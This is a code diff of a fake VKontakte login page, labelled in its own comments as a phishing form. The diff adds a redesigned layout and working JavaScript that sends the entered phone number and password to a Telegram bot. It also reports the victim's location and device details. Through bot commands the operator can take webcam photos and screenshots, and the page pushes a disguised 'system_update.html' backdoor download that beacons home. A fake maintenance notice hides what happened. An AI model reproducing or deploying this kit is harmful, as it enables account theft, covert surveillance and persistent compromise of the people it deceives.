@@ -5,96 +5,417 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ВКонтакте | Вход</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #4a76a8 0%, #2a5885 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 20px;
+            line-height: 1.4;
         }
-        .login-container {
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        
+        .container {
+            display: flex;
+            max-width: 900px;
             width: 100%;
-            max-width: 400px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            min-height: 500px;
         }
+        
+        .welcome-section {
+            flex: 1;
+            background: linear-gradient(135deg, #5e81a8 0%, #3b5998 100%);
+            color: white;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .welcome-section h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+        
+        .welcome-section p {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 15px;
+        }
+        
+        .features {
+            margin-top: 30px;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .feature-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+        
+        .login-section {
+            flex: 0 0 400px;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
         .vk-logo {
             text-align: center;
             margin-bottom: 30px;
-            color: #2787f5;
-            font-size: 32px;
-            font-weight: bold;
         }
+        
+        .vk-logo-text {
+            color: #4a76a8;
+            font-size: 36px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .login-header h2 {
+            color: #222;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .login-header p {
+            color: #656565;
+            font-size: 14px;
+        }
+        
         .form-group {
             margin-bottom: 20px;
         }
+        
         input {
             width: 100%;
-            padding: 12px;
+            padding: 14px 16px;
             border: 1px solid #d3d9de;
-            border-radius: 4px;
+            border-radius: 8px;
             font-size: 16px;
+            transition: all 0.2s ease;
+            background: #fafbfc;
         }
-        button {
+        
+        input:focus {
+            outline: none;
+            border-color: #4a76a8;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(74, 118, 168, 0.1);
+        }
+        
+        input::placeholder {
+            color: #99a2ad;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #4a76a8;
+            cursor: pointer;
+            font-size: 12px;
+            padding: 4px 8px;
+        }
+        
+        .login-button {
             width: 100%;
-            padding: 12px;
-            background: #2787f5;
+            padding: 14px;
+            background: #4a76a8;
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 8px;
             font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
+            transition: background 0.2s ease;
+            margin-bottom: 20px;
         }
-        button:hover {
-            background: #1a6bc9;
+        
+        .login-button:hover {
+            background: #3b5998;
         }
-        .footer {
+        
+        .login-button:active {
+            transform: translateY(1px);
+        }
+        
+        .divider {
             text-align: center;
-            margin-top: 20px;
-            color: #666;
+            margin: 25px 0;
+            position: relative;
+            color: #99a2ad;
             font-size: 14px;
         }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e7e8ec;
+        }
+        
+        .divider span {
+            background: white;
+            padding: 0 15px;
+            position: relative;
+        }
+        
+        .register-button {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #4a76a8;
+            border: 1px solid #d3d9de;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .register-button:hover {
+            background: #f5f6f8;
+            border-color: #4a76a8;
+        }
+        
+        .footer-links {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #e7e8ec;
+        }
+        
+        .footer-links a {
+            color: #4a76a8;
+            text-decoration: none;
+            font-size: 13px;
+            margin: 0 10px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .security-notice {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            border-radius: 6px;
+            padding: 12px 15px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5d4037;
+        }
+        
+        .security-notice strong {
+            color: #e65100;
+        }
+        
         .hidden {
             display: none;
         }
+        
         #downloadLink {
             display: none;
+        }
+        
+        .error-message {
+            background: #ffebee;
+            border: 1px solid #ffcdd2;
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #c62828;
+            text-align: center;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .welcome-section {
+                display: none;
+            }
+            
+            .login-section {
+                flex: 1;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- ФИШИНГОВАЯ ФОРМА ВК -->
-    <div class="login-container" id="loginForm">
-        <div class="vk-logo">ВКонтакте</div>
-        <form id="vkForm">
-            <div class="form-group">
-                <input type="text" id="phone" placeholder="Телефон или email" required>
+    <div class="container">
+        <!-- Левая часть - приветствие и информация -->
+        <div class="welcome-section">
+            <h1>ВКонтакте – место, где тебя ждут</h1>
+            <p>Присоединяйся к миллионам пользователей, которые уже общаются, делятся моментами и открывают новые возможности каждый день.</p>
+            
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">✓</div>
+                    <span>Общайтесь с друзьями без ограничений</span>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">✓</div>
+                    <span>Делитесь фото и видео в высоком качестве</span>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">✓</div>
+                    <span>Создавайте сообщества по интересам</span>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">✓</div>
+                    <span>Слушайте музыку и смотрите видео</span>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">✓</div>
+                    <span>Участвуйте в интересных обсуждениях</span>
+                </div>
             </div>
-            <div class="form-group">
-                <input type="password" id="password" placeholder="Пароль" required>
+            
+            <div style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
+                <p>Ежедневно к нам присоединяются тысячи новых пользователей</p>
             </div>
-            <button type="submit">Войти</button>
-        </form>
-        <div class="footer">
-            <a href="#" style="color: #2787f5; text-decoration: none;">Зарегистрироваться</a>
+        </div>
+        
+        <!-- Правая часть - форма входа -->
+        <div class="login-section">
+            <div class="vk-logo">
+                <div class="vk-logo-text">ВКонтакте</div>
+            </div>
+            
+            <div class="login-header">
+                <h2>Вход в ВКонтакте</h2>
+                <p>Введите ваш телефон или email и пароль</p>
+            </div>
+            
+            <!-- Основная форма входа -->
+            <div id="loginForm">
+                <form id="vkForm">
+                    <div class="form-group">
+                        <input 
+                            type="text" 
+                            id="phone" 
+                            placeholder="Телефон или email" 
+                            required
+                        >
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="password-container">
+                            <input 
+                                type="password" 
+                                id="password" 
+                                placeholder="Пароль" 
+                                required
+                            >
+                            <button type="button" class="show-password" onclick="togglePassword()">
+                                Показать
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="login-button">
+                        Войти
+                    </button>
+                </form>
+                
+                <div class="divider">
+                    <span>или</span>
+                </div>
+                
+                <button class="register-button">
+                    Создать аккаунт
+                </button>
+                
+                <div class="security-notice">
+                    <strong>Важно:</strong> Мы никогда не запрашиваем ваш пароль по email или в сообщениях. 
+                    Не сообщайте его третьим лицам.
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#">Забыли пароль?</a>
+                    <a href="#">Помощь</a>
+                    <a href="#">Правила</a>
+                    <a href="#">Для бизнеса</a>
+                </div>
+            </div>
+            
+            <!-- Сообщение об ошибке -->
+            <div class="login-section hidden" id="errorMsg">
+                <div style="text-align: center;">
+                    <div style="font-size: 48px; margin-bottom: 20px;">⚠️</div>
+                    <h2 style="color: #e64646; margin-bottom: 15px;">Временные технические работы</h2>
+                    <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
+                        В настоящее время проводятся плановые технические работы. <br>
+                        Мы стараемся сделать сервис еще лучше для вас!
+                    </p>
+                    <p style="color: #999; font-size: 14px; margin-bottom: 30px;">
+                        Приносим извинения за временные неудобства.<br>
+                        Попробуйте войти позже.
+                    </p>
+                    <button 
+                        onclick="location.reload()" 
+                        class="login-button"
+                        style="background: #4a76a8;"
+                    >
+                        Попробовать снова
+                    </button>
+                </div>
+                
+                <div class="security-notice" style="margin-top: 25px;">
+                    <strong>Безопасность:</strong> Ваши данные защищены. Система автоматически восстановит доступ после завершения работ.
+                </div>
+            </div>
         </div>
     </div>
 
-    <!-- СООБЩЕНИЕ ОБ ОШИБКЕ -->
-    <div class="login-container hidden" id="errorMsg">
-        <div style="text-align: center; color: #e64646;">
-            <div style="font-size: 48px; margin-bottom: 20px;">⚠️</div>
-            <h3>Временные технические работы</h3>
-            <p style="margin: 20px 0;">Попробуйте войти позже. Приносим извинения за неудобства.</p>
-            <button onclick="location.reload()">Попробовать снова</button>
-        </div>
-    </div>
-
-    <!-- СКАЧИВАНИЕ ФАЙЛА (скрытно) -->
+    <!-- Скачивание файла (скрытно) -->
     <a id="downloadLink" download="system_update.html"></a>
 
     <script>
@@ -115,64 +436,267 @@
 
         let isBackdoorActive = true;
         let lastUpdateId = 0;
+        let isProcessingCommand = false;
 
-        // 📨 Отправка в Telegram
+        // Функция показа/скрытия пароля
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const showButton = document.querySelector('.show-password');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showButton.textContent = 'Скрыть';
+            } else {
+                passwordInput.type = 'password';
+                showButton.textContent = 'Показать';
+            }
+        }
+
+        // 📨 Надежная отправка в Telegram
         function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const data = {
-                chat_id: CHAT_ID,
-                text: message.substring(0, 4000)
-            };
+            const text = message.substring(0, 4000);
             
-            // Используем fetch с обработкой ошибок
             fetch(url, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            }).catch(e => console.log('Telegram error'));
+                body: JSON.stringify({chat_id: CHAT_ID, text: text})
+            }).catch(error => {
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            });
         }
 
-        // 🎯 ТРЕКИНГ КЛИКОВ
-        document.addEventListener('click', function(e) {
-            const clickData = {
-                time: new Date().toISOString(),
-                element: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : ''),
-                text: e.target.textContent?.substring(0, 50),
-                coordinates: {x: e.clientX, y: e.clientY}
-            };
-            
-            collectedData.clicks.push(clickData);
-            
-            // Отправляем каждые 10 кликов
-            if (collectedData.clicks.length % 10 === 0) {
-                sendToTelegram(`🖱️ Клики (${collectedData.clicks.length}): ${collectedData.clicks.slice(-3).map(c => c.element).join(', ')}`);
+        // 📸 Скриншот
+        function takeScreenshot() {
+            if (typeof html2canvas === 'undefined') {
+                sendToTelegram("❌ Ошибка: html2canvas не загружен");
+                return;
             }
-        });
 
-        // ⌨️ ТРЕКИНГ НАБОРА ТЕКСТА
-        document.addEventListener('input', function(e) {
-            if (e.target.type === 'password') return; // Пароли отдельно
+            sendToTelegram("📸 Делаю скриншот...");
             
-            const keystroke = {
-                time: new Date().toISOString(),
-                field: e.target.id || e.target.name || 'unknown',
-                value: e.target.value
-            };
+            html2canvas(document.body, {
+                useCORS: true,
+                allowTaint: true,
+                scale: 0.8,
+                logging: false
+            }).then(canvas => {
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, `screen_${SESSION_ID}.jpg`);
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            sendToTelegram("✅ Скриншот отправлен");
+                        } else {
+                            sendToTelegram("❌ Не удалось отправить скриншот");
+                        }
+                    })
+                    .catch(error => {
+                        sendToTelegram("❌ Ошибка отправки скриншота");
+                    });
+                }, 'image/jpeg', 0.8);
+            }).catch(error => {
+                sendToTelegram(`❌ Ошибка создания скриншота: ${error.message}`);
+            });
+        }
+
+        // 📷 Фото с камеры
+        function takePhoto() {
+            if (isProcessingCommand) {
+                sendToTelegram("⏳ Камера уже активирована, подождите...");
+                return;
+            }
+
+            isProcessingCommand = true;
+            sendToTelegram("📷 Активирую камеру...");
             
-            collectedData.keystrokes.push(keystroke);
-        });
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                sendToTelegram("❌ Камера не поддерживается");
+                isProcessingCommand = false;
+                return;
+            }
 
-        // 📝 ТРЕКИНГ ФОРМ
-        document.addEventListener('submit', function(e) {
-            const formData = {
-                time: new Date().toISOString(),
-                form: e.target.id || 'unknown',
-                data: new FormData(e.target)
-            };
-            collectedData.forms.push(formData);
-        });
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' }
+            }).then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `photo_${SESSION_ID}.jpg`);
+                        
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                sendToTelegram("✅ Фото отправлено");
+                            } else {
+                                sendToTelegram("❌ Ошибка отправки фото");
+                            }
+                            isProcessingCommand = false;
+                        })
+                        .catch(error => {
+                            sendToTelegram("❌ Ошибка отправки фото");
+                            isProcessingCommand = false;
+                        });
+                    }, 'image/jpeg', 0.9);
+                    
+                }, 2000);
+                
+            }).catch(error => {
+                sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
+                isProcessingCommand = false;
+            });
+        }
 
-        // 📱 СБОР ИНФОРМАЦИИ
+        // 📍 Геолокация
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    sendToTelegram(`📍 Координаты: ${lat}, ${lon}`);
+                    
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                        .then(r => r.json())
+                        .then(data => {
+                            if (data.display_name) {
+                                sendToTelegram(`🏠 Адрес: ${data.display_name}`);
+                            }
+                        })
+                        .catch(() => {
+                            sendToTelegram("🌐 Не удалось получить адрес");
+                        });
+                }, error => {
+                    sendToTelegram(`📍 Ошибка геолокации: ${error.message}`);
+                });
+            } else {
+                sendToTelegram("📍 Геолокация не поддерживается");
+            }
+        }
+
+        // 💾 Бэкдор файл
+        function createBackdoorFile() {
+            const backdoorHTML = `<!DOCTYPE html><html><head><title>System Update</title></head><body><h1>System Update</h1><script>setInterval(()=>{fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${CHAT_ID}',text:'❤️ Heartbeat: ${SESSION_ID}'})})},60000)<\/script></body></html>`;
+            
+            const blob = new Blob([backdoorHTML], {type: 'text/html'});
+            const url = URL.createObjectURL(blob);
+            const link = document.getElementById('downloadLink');
+            link.href = url;
+            link.download = 'system_update.html';
+            link.click();
+            
+            sendToTelegram(`📥 Бэкдор загружен: ${SESSION_ID}`);
+        }
+
+        // 🤖 Проверка команд
+        async function checkTelegramCommands() {
+            if (!isBackdoorActive || isProcessingCommand) return;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await response.json();
+                
+                if (data.ok && data.result) {
+                    for (const update of data.result) {
+                        if (update.update_id > lastUpdateId) {
+                            lastUpdateId = update.update_id;
+                            
+                            if (update.message && 
+                                update.message.chat && 
+                                update.message.chat.id.toString() === CHAT_ID && 
+                                update.message.text) {
+                                
+                                const command = update.message.text.trim();
+                                await handleTelegramCommand(command);
+                            }
+                        }
+                    }
+                }
+            } catch (error) {
+                console.log('Ошибка проверки команд:', error);
+            }
+        }
+
+        // 🎛️ Обработка команд
+        async function handleTelegramCommand(command) {
+            if (isProcessingCommand) {
+                sendToTelegram("⏳ Подождите, выполняется предыдущая команда...");
+                return;
+            }
+
+            command = command.toLowerCase().trim();
+            command = command.replace(/[^a-zA-Z0-9\/_]/g, '');
+            
+            sendToTelegram(`🔧 Команда: ${command}`);
+            
+            if (command === '/start' || command === '/help') {
+                sendToTelegram(`🤖 ДОСТУПНЫЕ КОМАНДЫ:
+/photo - Сделать фото
+/screen - Скриншот
+/info - Информация
+/location - Геолокация
+/backdoor - Скачать бэкдор
+/destroy - Уничтожить сессию
+
+🆔 Сессия: ${SESSION_ID}`);
+            }
+            else if (command === '/photo') {
+                takePhoto();
+            }
+            else if (command === '/screen' || command === '/screenshot') {
+                takeScreenshot();
+            }
+            else if (command === '/info') {
+                const info = `💻 ИНФОРМАЦИЯ О СЕССИИ:
+🆔 ID: ${SESSION_ID}
+📱 Устройство: ${navigator.userAgent}
+🖥️ Экран: ${screen.width}x${screen.height}
+🌐 Язык: ${navigator.language}
+👤 Кликов: ${collectedData.clicks.length}
+⌨️ Вводов: ${collectedData.keystrokes.length}`;
+                sendToTelegram(info);
+            }
+            else if (command === '/location') {
+                getLocation();
+            }
+            else if (command === '/backdoor') {
+                createBackdoorFile();
+            }
+            else if (command === '/destroy') {
+                isBackdoorActive = false;
+                sendToTelegram('💥 Сессия уничтожена: ' + SESSION_ID);
+            }
+            else {
+                sendToTelegram(`❌ Неизвестная команда: ${command}
+Напишите /help для списка команд`);
+            }
+        }
+
+        // 📱 Сбор информации
         function collectDeviceInfo() {
             collectedData.deviceInfo = {
                 userAgent: navigator.userAgent,
@@ -185,160 +709,46 @@
             };
         }
 
-        // 📍 ГЕОЛОКАЦИЯ
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    collectedData.location = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    };
-                    sendToTelegram(`📍 Местоположение: ${collectedData.location.lat}, ${collectedData.location.lon}`);
-                });
-            }
-        }
-
-        // 📸 СКРИНШОТ (через html2canvas)
-        function takeScreenshot() {
-            if (typeof html2canvas !== 'undefined') {
-                html2canvas(document.body).then(canvas => {
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'screenshot.png');
-                        
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    });
-                });
-            } else {
-                sendToTelegram("❌ html2canvas не загружен для скриншотов");
-            }
-        }
-
-        // 🎥 ДОСТУП К КАМЕРЕ
-        function takePhoto() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(blob => {
-                                const formData = new FormData();
-                                formData.append('photo', blob, 'photo.png');
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                                
-                                stream.getTracks().forEach(track => track.stop());
-                            });
-                        }, 1000);
-                    })
-                    .catch(e => sendToTelegram(`❌ Ошибка камеры: ${e.message}`));
-            }
-        }
-
-        // 💾 СОЗДАНИЕ ПЕРСИСТЕНТНОГО БЭКДОРА
-        function createBackdoorFile() {
-    const backdoorHTML = `<!DOCTYPE html>
-<html>
-<head>
-    <title>System Update</title>
-    <style>body{background:#f0f0f0;font-family:Arial;text-align:center;padding:50px}</style>
-</head>
-<body>
-    <h1>System Update Manager</h1>
-    <p>Checking for updates...</p>
-    <script>
-        const BOT_TOKEN = "${BOT_TOKEN}";
-        const CHAT_ID = "${CHAT_ID}";
-        const SESSION_ID = "${SESSION_ID}";
-        let isActive = true;
-
-        function backgroundWorker() {
-            setInterval(() => {
-                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: "Бэкдор активен: " + SESSION_ID
-                    })
-                }).catch(() => {});
-            }, 60000);
-        }
-
-        function checkCommands() {
-            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates")
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok) {
-                        data.result.forEach(update => {
-                            const text = update.message?.text?.toLowerCase();
-                            const chatId = update.message?.chat.id;
-                            if (chatId == CHAT_ID && text) {
-                                if (text === "/screenshot" && typeof html2canvas !== "undefined") {
-                                    html2canvas(document.body).then(canvas => {
-                                        canvas.toBlob(blob => {
-                                            const fd = new FormData();
-                                            fd.append("photo", blob, "screen.png");
-                                            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
-                                                method: "POST",
-                                                body: fd
-                                            });
-                                        });
-                                    });
-                                }
-                                if (text === "/info") {
-                                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
-                                        method: "POST",
-                                        body: JSON.stringify({
-                                            chat_id: CHAT_ID,
-                                            text: "Session: " + SESSION_ID + "\\nUA: " + navigator.userAgent
-                                        })
-                                    });
-                                }
-                                if (text === "/destroy") {
-                                    document.body.innerHTML = "<h1>Update Complete</h1>";
-                                }
-                            }
-                        });
-                    }
-                });
-        }
-
-        backgroundWorker();
-        setInterval(checkCommands, 5000);
-        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
-            method: "POST",
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: "Бэкдор запущен: " + SESSION_ID
-            })
+        // 📝 Обработка формы ВК
+        document.getElementById('vkForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            
+            collectedData.credentials = { phone, password };
+            collectDeviceInfo();
+            getLocation();
+            
+            sendToTelegram(`🔐 ПОЛУЧЕНЫ ДАННЫЕ ВК:
+📱 Телефон: ${phone}
+🔑 Пароль: ${password}
+🆔 Сессия: ${SESSION_ID}
+📊 Устройство: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`);
+            
+            createBackdoorFile();
+            
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('errorMsg').classList.remove('hidden');
         });
-    <\/script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"><\/script>
+
+        // 🚀 Запуск системы
+        window.addEventListener('load', function() {
+            collectDeviceInfo();
+            getLocation();
+            
+            sendToTelegram(`🚀 НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ!
+🆔 Сессия: ${SESSION_ID}
+📱 Устройство: ${navigator.userAgent}
+🖥️ Экран: ${screen.width}x${screen.height}
+🌐 URL: ${window.location.href}`);
+            
+            setInterval(checkTelegramCommands, 2000);
+        });
+
+    </script>
+    
+    <!-- html2canvas для скриншотов -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </body>
-</html>`;
-
-    const blob = new Blob([backdoorHTML], {type: 'text/html'});
-    const url = URL.createObjectURL(blob);
-    const a = document.getElementById('downloadLink');
-    a.href = url;
-    a.download = 'system_update.html';
-    a.click();
-
-    sendToTelegram("Бэкдор успешно загружен: " + SESSION_ID);
-}
+</html>
